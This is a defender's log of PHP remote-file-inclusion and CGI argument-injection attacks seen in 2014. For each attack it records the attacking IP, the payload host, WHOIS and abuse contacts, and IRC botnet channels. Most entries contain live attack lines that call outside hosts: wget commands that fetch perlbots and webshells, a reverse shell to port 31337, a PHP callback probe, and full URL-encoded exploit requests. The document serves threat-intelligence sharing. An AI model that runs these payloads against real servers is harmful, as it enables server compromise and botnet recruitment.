#PHP-RFI Attacks
#This is a collection of PHP RFI attackers I've seen on a variety of servers I'm responsible for securing.
#Essentially, these servers were seen attempting to exploit CVE 2012-1823, 2311, 2335 and 2336.
# Apparently a lot of botnets spread via this vulnerability combined with RFI attacks.
# This file has the following format:
#Pitcher: Who threw the exploit
#Catcher: Who is the exploiter telling the target server to call back to for a payload
#NSlookup (pitcher/catcher): Domain name/data for Pitchers and Catchers
#WHOIS (pitcher/catcher): collects a bunch of whois data for pitchers and catchers -- route, org name, country, abuse contacts, AS number... if they were available.
#Payload: payload seen in PHP code attackers tried to RFI/prepend to the server
#Description: what does the payload do?
#Server: any servers the payload is seen calling back to
#Port: port the payload calls back to
#Channel: for IRC bots, what channel does it connect to?
#NSlookup: domain info for the payload IP address
#WHOIS: whois data for the payload IP address
#Notes: misc notes.

#8/22/14:

Pitcher: 96.8.126.97
Catcher: 108.61.91.211
Nslookup (pitcher): s1-dallas.cloudhostservers.com.
WHOIS (pitcher):
96.8.126.0 - 96.8.126.255
ColoCrossing/CLDR.eu
NSlookup (catcher): pvtinsiderdl.com.
WHOIS (catcher):
108.61.0.0 - 108.61.255.255
GRABWEB hosting/Choopa LLC
Payload: wget http://108.61.91.211/pd.pdf
Description: perlbot
Server: 217.174.250.46
Port: 80
Channel: #113
NSlookup: server217-174-250-46.live-servers.net
WHOIS:
217.174.240.0/20
Fasthosts Internet Limited
UK
abuse@fasthosts.co.uk
AS15418
Notes:

Pitcher: 187.108.192.62
Catcher: 200.98.224.16
NSlookup (pitcher): linux.nrserver23.net
WHOIS (pitcher):
187.108.192/20
SNH Serviï¿½os de Internet Ltda.
BR
security@eveo.com.br
AS53107
NSlookup (catcher): loja.fastherba.com.br
WHOIS (catcher):
200.98.0.0/16
Universo Online S.A.
BR
security@uol.com.br
cert@cert.br
mail-abuse@cert.br
AS15201
Payload: wget http://loja.fastherba.com.br/lol/lista/pica/r.txt
Description: R57 webshell (related to C99, etc.)
Server:
Port:
Channel:
NSlookup:
WHOIS:
Notes:

Pitcher: 91.209.192.252
Catcher: 91.209.192.252
NSlookup (pitcher): xenmaster34.drecomm.nl.
WHOIS (pitcher):
91.209.192.0/24
Drecomm BV
NL
systeembeheer@drecomm.nl
AS8312
NSlookup (catcher):
WHOIS (catcher):
Payload:wget http://94.102.63.238/robotel.txt
Description: perlbot
Server: 94.102.63.238
Port: 443
Channel: #php,#work 
NSlookup:
WHOIS:
Notes: pitcher, catcher, perlbot server are all the same

Pitcher: 75.98.84.57
Catcher: 208.85.177.238
Nslookup (pitcher): NX
WHOIS (pitcher):
75.98.84.48 - 75.98.84.63
Internap Network Services/Eleven Inc.
NSlookup (catcher): 208-85-177-238.peakinter.net
WHOIS (catcher):
208.85.176.0/21
PEAKINTERNET
US
noc@peakinter.net
Payload: wget 208.85.177.238/speedtest/.a/hb/php04
Description: Perlbot
Server: 194.24.228.203
Port: 443
Channel: #allornothing
NSlookup: 194-24-228-203.thya.net.
WHOIS:
194.24.228.0/23
L'ile aux surfers s.a.r.l.
FR
abuse@ripe.net
AS41044
Notes:
- Informed peak they were serving malware ~ 1 week ago...

Pitcher: 77.92.76.182
Catcher: 77.92.76.182
NSlookup (pitcher): NX
WHOIS (pitcher):
77.92.64.0/19
UK2 Infrastructure
GB
urgent@submitabuse.com
AS13213
Payload: wget http://77.92.76.182/ls
Description: perlbot
Server: 217.174.250.46
Port: 80
Channel:#113
NSlookup: server217-174-250-46.live-servers.net
WHOIS:
217.174.240.0/20
FASTHOSTS-UK-DS-NETWORK
GB
abuse@fasthosts.co.uk
AS15418
Notes:
-Seen other servers serving similar payload. Connects to same channel.
-Very Busy: 227 hits seen this weekend (1600 Fri - 800 Mon)

Pitcher: 80.82.78.12
Catcher: 80.82.78.12
NSlookup (pitcher): b19s12.anonib.com
WHOIS:
80.82.78.0/24
NL-ECATEL-20100816
Ecatel LTD
NL
AS29073
Payload: http://80.82.78.12/wut, Reverse shell to 80.82.78.12:31337
Description: perlbot
Server: 173.208.146.46
Port: 6667
Channel: #pbot
NSlookup: NX
WHOIS:
173.208.128.0/17
WholeSale Internet, Inc.
US
abuse@wholesaleinternet.net
admin@wholesaleinternet.net
aaron@wholesaleinternet.com
AS32097
Notes:
-Not the first time we've seen this payload, either.
-Sans ISC reported on this. Wonder if they troll my malware feed :D

Pitcher: 89.136.120.205
Catcher: www.astraltor.de
NSlookup (Pitcher): NX
WHOIS (Pitcher):
89.136.0.0/16
UPCRO
RO
abuse-mailbox:  abuse@upc.ro
origin:         AS6830
NSlookup (Catcher): 85.214.150.6
WHOIS (Catcher):
85.214.150.0/24
Strato AG
DE
abuse@strato.de
AS6724
Payload: wget http://www.astraltor.de/php, wget http://www.astraltor.de/a
Description: php is a perlbot, while a is a shell script that pulls down php as well as BTC miner binaries. Overall goal appears to be mining of bitcoin.
Server: 80.240.137.183
Port: 3303
Channel: #work
NSlookup: server.oakleyharrod.com
WHOIS: 
80.240.128.0 - 80.240.143.255
Digital Ocean, Inc.
NL
abuse@digitalocean.com
Notes:
-not the first time I've seen astraltor.de as a catcher
-not the first time seeing these payloads.
-first time seeing this pitcher, though.

pitcher: 120.37.236.161
catcher: api.alihack.com
NSlookup (pitcher): 161.236.37.120.broad.pt.fj.dynamic.163data.com.cn
WHOIS (pitcher):
120.32.0.0 - 120.39.255.255
CHINANET FUJIAN PROVINCE NETWORK
CN
abuse@fjdcb.fz.fj.cn
anti-spam@ns.chinanet.cn.net
NSlookup (catcher): api.alihack.com -> ixyou.x.incapdns.net -> 192.230.66.78
WHOIS (catcher):
192.230.64.0/18
Incapsula Inc
US
abuse@incapsula.com
ip@incapsula.com
tomer@incapsula.com
AS19551
Payload: wget api.alihack.com/info.txt
Description: very small payload, posts to alihack.com. It's recon to ascertain PHP RFI vulnerability.
Notes: 
-121.205.200.35
-68.64.172.226
-59.58.159.25
-142.54.184.243
-121.205.200.35
-23.95.34.227 
- The IP addresses listed above are also throwing this same payload, this payload seems to be targeted towards the energy sector.

Pitcher: 188.190.98.18
Catcher: wp-blogstats.com
NSlookup (pitcher): hosted-in.infiumhost.com
WHOIS (pitcher):
188.190.98.0/24
Infium LLC
UA
abusemail@infiumhost.com
AS197145
NSlookup (catcher): 91.194.254.79
WHOIS (catcher):
91.194.254.0/23
Dimline Ltd.
AT
abuse@dimline.org
AS43449
Payload: <?php echo "Content-type: text/html";  @ignore_user_abort(true); file_get_contents('http://wp-blogstats.com/rf/s_v2.php?d='.$_SERVER['HTTP_HOST']); exit(0); ?>
Description: Not unlike alihack, this is a "touch" to see if a server is vulnerable to RFI attacks.
Notes:
-Also not unlike alihack, has a fixation towards the energy sector.

#8/29/14

Pitcher: 84.200.75.194
Catcher: 84.200.75.194
NSlookup (pitcher): 194.75.200.84.in-addr.arpa -> dedicated-server-anbieter.com.
WHOIS (pitcher):
84.200.0.0/16
Accelerated IT Services GmbH
DE
abuse@accelerated.de
AS31400
NSlookup (catcher):
WHOIS (catcher):
Payload: wget http://84.200.75.194/pds
Description: perlbot
Server: 50.56.238.185
Port: 80
Channel: #113
NSlookup: 50-56-238-185.static.cloud-ips.com.
WHOIS:
Rackspace Cloud Servers RACKS-8-1350332940593978 (NET-50-56-236-0-1) 50.56.236.0 - 50.56.239.255
Rackspace Hosting RACKS-8-NET-4 (NET-50-56-0-0-1) 50.56.0.0 - 50.57.255.255
Notes:

Pitcher: 107.167.11.226
Catcher: 107.167.11.226
NSlookup (pitcher): customer.sharktech.net
WHOIS (pitcher):
107.167.0.0 - 107.167.31.255
Sharktech
NSlookup (catcher):
WHOIS (catcher):
Payload: wget http://107.167.11.226/bot
Description: perlbot
Server: 50.56.238.185
Port: 80
Channel: #115, #my.info
NSlookup: 50-56-238-185.static.cloud-ips.com.
WHOIS:
50.56.236.0 - 50.56.239.255
Rackspace Cloud Hosting

Pitcher: 190.7.129.141
Catcher: www.kniha.sivok.sk
Nslookup (pitcher): dinamic-cable-190-7-129-141.epm.net.co
WHOIS (pitcher):
190.7.128/20
EPM Telecomunicaciones S.A. E.S.P.
CO
adminternet@UNE.NET.CO
NSlookup (catcher): 82.119.224.198
WHOIS (catcher):
82.119.224.0/20
WEBY GROUP, s.r.o.
SK
tech@webygroup.sk
AS5578
Payload: wget http://www.kniha.sivok.sk/letsex.php
Description: N/A
Notes: Payload seems to be based around clickfraud.

#8/29/14:

Pitcher: 58.56.136.154
Catcher: 213.5.67.223
NSlookup (pitcher): NX
WHOIS (pitcher):
58.56.0.0/15
CHINANET-SD
CN
ipreport@sdtele.com
anti-spam@ns.chinanet.cn.net
NSlookup (catcher): hosted-by.as51430.net
WHOIS (catcher):
213.5.64.0/21
AltusHost B.V.
abuse@as51430.net
AS51430
Payload: wget http://213.5.67.223/jpg
Description: perlbot
Server: 50.56.238.185
Port: 80
Channel: #114
NSlookup: 50-56-238-185.static.cloud-ips.com.
WHOIS:
50.56.236.0 - 50.56.239.255
Rackspace Cloud Hosting
Notes: 
-Saw this same server hosting the same IRC Command and Control
-85.25.73.217 is also pitching this same payload

Pitcher: 91.209.192.252
Catcher: 114.141.127.4
NSlookup (pitcher): xenmaster34.drecomm.nl.
WHOIS (pitcher):
91.209.192.0/24
Drecomm BV
NL
systeembeheer@drecomm.nl
AS8312
NSlookup (catcher): domain.not.configured
WHOIS (catcher):
114.141.112.0/20
OBTRIX-NZ
NZ
abuse@obtrix.net
ipadmin@obtrix.net
Payload: wget http://114.141.127.4/done
Description: perlbot
Server: myircd.uk.to
Port: 3303
Channel: #x
NSlookup: 213.133.99.68
WHOIS:
213.133.96.0/19
Hetzner Online AG
DE
abuse@hetzner.de
AS24940
Notes: 
- Saw  the same pitcher last week. different payload this time.
- domain.not.configured is a non-authoritative response I got for querying the Catcher's IP. Unique response. Doesn't resolve to an IP address

Pitcher: 23.23.211.99
Catcher: 32.multicsdb.com, 64.multicsdb.com
NSlookup (pitcher): ec2-23-23-211-99.compute-1.amazonaws.com.
WHOIS (pitcher):
23.20.0.0/14
Amazon EC2
US
aes-noc@amazon.com
ec2-abuse@amazon.com
AS16509
NSlookup (catcher): 188.165.14.158
WHOIS (catcher):
188.165.0.0/16
OVH SAS
FR
abuse@ovh.net
AS16276
Payload: 
wget http://64.multicsdb.com -P - -O 8FcGFwAT
wget http://32.multicsdb.com -P - -O gcRLUd8K
Description: BossaBot 32 and BossaBot64
Server: 212.117.180.91
Port: 8067
Channel: #bitchly_ #sloboz
NSlookup: irc.dreamboxdb.com
WHOIS: 
212.117.160.0/19
root esolutions
LU
abuse@as5577.net
AS5577
Notes:
-This Was a relatively fun one. Expect a blog post soon!
-Both 32 and 64.multicsdb.com resolve to the same domain
-Seems to be a BossaBot variant. Going to totally different IPs and domains.
-Payloads: bb5c5a893dda5314cb60f7214f339183b285f59c  8FcGFwAT 0779f7734d06c1657f20e966c6633867f81fee8c  gcRLUd8K
- 201.22.56.71 (Global Village Telecom, BR), 200.80.241.92 (magdelena virtual, AR), 46.29.252.216 (Webexxpurts, US), 46.22.128.196 (Blacknight, IE), 212.235.186.228 (academic and research network of slovenia, SI), 212.233.125.54 (AMT Group Telecom, RU), 174.36.7.10 (softlayer, US), 200.45.249.216 (AGENCIA ADVENTISTA DE DESARRO Y RECURSOS ASISTENCIALES ADRA, AR), 142.176.177.82 (Stentor National Integrated Communications Network, CA), 105.237.69.241, 105.237.54.82 (MTN Business SA Pool Region 7204, ZA), 23.21.90.253, 23.23.222.215 (Amazon EC2, US), 46.137.90.221 (Amazon AWS, IE), 87.229.163.22 (Foratec Communication, RU) also throwing this.

Pitcher: 159.8.9.130
Catcher:
NSlookup (pitcher):
WHOIS (pitcher):
159.8.9.128/29
IBM - IBMCCMPL
FR
jph.silvent@fr.ibm.com
NSlookup (catcher):
WHOIS (catcher):
Payload: /?-d%20allow_url_include%3don+-d%20auto_prepend_file%3d1vuln1%20-n
Description: payload unknown.
Server:
Port:
Channel: 
NSlookup: 
WHOIS: 
Notes:
- Fixated with the energy sector... all hits were pointed towards energy sector domains. 
- No Catcher IPs or CnC payloads detected.

Pitcher: 222.216.28.248
Catcher: 208.85.177.238
Nslookup (pitcher): NX
WHOIS (pitcher):
222.216.0.0/15
CHINANET-GX
CN
anti-spam@ns.chinanet.cn.net
NSlookup (catcher): 208-85-177-238.peakinter.net
WHOIS (catcher):
208.85.176.0/21
PEAKINTERNET
US
noc@peakinter.net
Payload: wget 208.85.177.238/speedtest/.a/hb/php02
Description: Perlbot
Server: 194.24.228.203
Port: 443
Channel: #allornothing
NSlookup: 194-24-228-203.thya.net.
WHOIS:
194.24.228.0/23
L'ile aux surfers s.a.r.l.
FR
abuse@ripe.net
AS41044
Notes:
- New Pitcher, old payload.
- Also requests a shell callback to 91.121.105.21:22 unencrypted. (OVH France)

Pitcher: 192.3.183.172
Catcher: 192.3.183.172
NSlookup (pitcher): NX
WHOIS (pitcher):
192.3.0.0/16
ColoCrossing
abuse@colocrossing.com
support@colocrossing.com
AS36352
NSlookup (catcher): NX
WHOIS (catcher):
192.3.0.0/16
ColoCrossing
abuse@colocrossing.com
support@colocrossing.com
AS36352
Payload: wget http://192.3.183.172/file wget http://192.3.183.172/wut
Description: perlbot
Server: 173.208.146.46
Port: 6667
Channel: #Apache, #pbot
NSlookup: NX
WHOIS:
173.208.128.0/17
WholeSale Internet, Inc
US
admin@wholesaleinternet.net
abuse@wholesaleinternet.net
Notes:

Returning Champions:
107.167.11.226
188.190.98.18

#9/5/14:

Pitcher: 199.115.228.177
Catcher: unknown
NSlookup (pitcher): NX
WHOIS (pitcher):
199.115.228.0/22
VOLUMEDRIVE
US
info@volumedrive.com
AS46664
NSlookup (catcher): unknown
WHOIS (catcher): unknown
Payload:  unknown
Description: Base64 Encoding on the payload. Too large for IDS to capture entire payload
Server: unknown
Port: unknown
Channel: unknown
NSlookup: unknown
WHOIS: unknown
Notes:
- A lot of Base 64. So much that the IDS has trouble capturing the whole thing. Here's what the header and the start of the RFI looks like:
POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%22%79%65%73%22+%2D%64+%63%67%69%2E%66%69%78%5F%70%61%74%68%69%6E%66%6F%3D%31+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 54569
Connection: close
<?php
$bufferf = '<tons of base64 encoding here>
- The URL encoding is the part of the RFI exploit, where the header/PHP below is the portion that executes a payload, or tells the attacked system where to call back to get the payload.. Any information on this?
- Also saw 202.51.195.26 Pitching this.

Pitcher: 89.248.160.212
Catcher: 54.209.129.218
NSlookup (pitcher): mcquarrie.shaperetrieve.com
WHOIS (pitcher):
89.248.160.0/21
Ecatel LTD
NL
abuse@ecatel.net
AS29073
NSlookup (catcher): outkastsgaming.com
WHOIS (catcher):
Amazon Web Services
Payload: wget http://outkastsgaming.com/download/nice.png
Description: perlbot
Server: 94.102.52.10
Port: 6667
Channel: #perl
NSlookup: hosted-by.ecatel.net
WHOIS:
Ecatel LTD
NL
abuse@ecatel.net
AS29073
94.102.48.0/20
Notes:
-Outkast gaming is a pretty popular gaming clan that spans many games. Interesting choice in tact.
-Also interesting that the Pitcher and Payload server use the same hosting provider.

Pitcher: 64.15.76.98
Catcher: 64.15.76.98
NSlookup (pitcher): NX
WHOIS (pitcher):
Netelligent Hosting Services
NSlookup (catcher): NX
WHOIS (catcher):
Netelligent Hosting Services
Payload: wget http://64.15.76.98/lak
Description: perlbot
Server: unknown
Port: unknown
Channel: unknown
NSlookup: unknown
WHOIS: unknown
Notes:
-tried acquiring payload; server was not responding to web requests. possibly already taken down?
Pitcher: 194.60.242.251
Catcher: 208.85.177.238
Nslookup (pitcher): NX
WHOIS (pitcher):
194.60.242.0/24
Intercom + LLC
RU

AS57470
Internap Network Services/Eleven Inc.
NSlookup (catcher): 208-85-177-238.peakinter.net
WHOIS (catcher):
208.85.176.0/21
PEAKINTERNET
US
noc@peakinter.net
Payload: wget 208.85.177.238/speedtest/.a/hb/php08
Description: Perlbot
Server: 194.24.228.203
Port: 443
Channel: #allornothing
NSlookup: 194-24-228-203.thya.net.
WHOIS:
194.24.228.0/23
L'ile aux surfers s.a.r.l.
FR
abuse@ripe.net
AS41044
Notes:
- Does the Catcher IRC Server look familiar? I thought it would. Peak still has yet to fix their server actively serving payloads. 
- Also saw 80.73.9.164 Referring to 208.85.177.238/speedtest/.a/hb/php07 (same payload)

